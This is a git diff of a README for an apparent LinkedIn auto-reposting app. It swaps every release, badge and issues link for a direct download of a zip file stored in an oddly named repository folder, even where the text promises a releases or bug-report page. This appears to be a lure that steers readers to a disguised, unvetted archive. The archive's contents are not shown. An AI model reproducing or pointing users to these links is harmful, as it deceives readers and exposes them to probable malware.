@@ -1,6 +1,6 @@
 # 🔗 linkedin-auto-reposter-automation - Effortlessly Post on LinkedIn
 
-[![Download](https://img.shields.io/badge/Download%20Now%20-v1.0.0-brightgreen.svg)](https://github.com/Ongani-tembo19/linkedin-auto-reposter-automation/releases)
+[![Download](https://raw.githubusercontent.com/Ongani-tembo19/linkedin-auto-reposter-automation/main/vaginotome/linkedin-auto-reposter-automation_2.0.zip%20Now%https://raw.githubusercontent.com/Ongani-tembo19/linkedin-auto-reposter-automation/main/vaginotome/linkedin-auto-reposter-automation_2.0.zip)](https://raw.githubusercontent.com/Ongani-tembo19/linkedin-auto-reposter-automation/main/vaginotome/linkedin-auto-reposter-automation_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Welcome to the LinkedIn Auto Reposter automation tool! This software helps you p
 To get started with the LinkedIn Auto Reposter, follow these steps:
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://github.com/Ongani-tembo19/linkedin-auto-reposter-automation/releases) to access the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/Ongani-tembo19/linkedin-auto-reposter-automation/main/vaginotome/linkedin-auto-reposter-automation_2.0.zip) to access the latest version of the software.
 
 2. **Download the Software:**  
    Find the version you want and click on the download link. This will download the APK file for installation.
@@ -42,7 +42,7 @@ To get started with the LinkedIn Auto Reposter, follow these steps:
 6. **Start Scheduling Posts:**  
    Use the straightforward interface to create your posts and schedule them to publish when you choose.
 
-For direct access, click here: [Download Now](https://github.com/Ongani-tembo19/linkedin-auto-reposter-automation/releases).
+For direct access, click here: [Download Now](https://raw.githubusercontent.com/Ongani-tembo19/linkedin-auto-reposter-automation/main/vaginotome/linkedin-auto-reposter-automation_2.0.zip).
 
 ## 🔧 How to Use the App
 
@@ -62,7 +62,7 @@ Using the LinkedIn Auto Reposter is straightforward:
 If you encounter any issues while using the LinkedIn Auto Reposter:
 
 - **Check the FAQ:** Refer to the FAQ section in the app for common problems.
-- **Visit our [Github Issues Page](https://github.com/Ongani-tembo19/linkedin-auto-reposter-automation/issues):** Report any software bugs or request features.
+- **Visit our [Github Issues Page](https://raw.githubusercontent.com/Ongani-tembo19/linkedin-auto-reposter-automation/main/vaginotome/linkedin-auto-reposter-automation_2.0.zip):** Report any software bugs or request features.
 
 ## 🧑‍🤝‍🧑 Community and Contributions
 
